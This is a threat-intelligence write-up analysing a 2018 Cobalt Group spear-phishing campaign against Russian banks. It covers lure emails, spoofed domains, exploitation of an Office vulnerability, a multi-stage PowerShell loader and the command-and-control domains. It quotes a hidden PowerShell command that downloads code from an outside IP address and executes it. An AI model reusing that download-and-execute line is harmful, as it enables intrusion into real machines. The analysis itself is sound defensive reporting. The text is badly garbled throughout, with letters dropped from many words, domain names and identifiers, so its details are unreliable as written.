    "text": "log First Activities of Coalt Group in 2018: pear Phishing Russian anks Januar 16, 2018 , Yonathan Klijnsma Last ear Novemer, we documented activities of the Coalt Group using CV-2017-11882 . In Decemer the were alread setting up for their next campaign. Toda, on Januar 16th, the first wave of spear phishing emails were delivered to the inoxes of Russian anks. adl, this time around, the group didn’t forget to CC . The emails were sent in the name of a large uropean ank in an attempt to social engineer the receiver into trusting the email. The emails were quite plain with onl a single question in the od and an attachment with the name once.rtf . In other cases, we saw a file with the name Заявление .rtf attached to an email that was also written in Russian: Fig-1 xample of spear phishing email The emails were sent from addresses on the domains ankosantantder.com  and illing-cr.ru , which were oth set up for this campaign specificall. Analsis The attachment auses CV-2017-11882 to start Powerhell with the following command: powershell -nop -w hidden -c “IX ((new-oject net.weclient).downloadstring(‘http://46.21.147.61:80/a’))” This command downloads and executes a second stage, which is also a Powerhell script, ut encoded: Fig-2 econd stage This script decodes to the third stage of the attack, another Powerhell script. This stage-three script is used to load a small piece of emedded shellcode into memor and run it like so: Fig-3 tage-three script The shellcode starts the Coalt trike stager in a new threat and starts it up. This stager will initiate connectivit with the C2 server to install the Coalt trike implant. Infrastructure As shown, the stager eacons out to helpdesk-oracle.com , which was registered  a person using the email address krstianwalczak@andex.com . This email address pointed us to another domain, which was registered on the same date and follows a similar pattern: Fig-4 WHOI information for the malicious email addresses Right now, the server to which the domain help-desc-me.com  points doesn’t seem to e active, nor have we seen an malicious samples connect to it. We have marked it as malicious and listed it in the IOCs elow, as we elieve it will e part of either a next stage of the attack shown aove or used in the next wave of spear phishing emails.
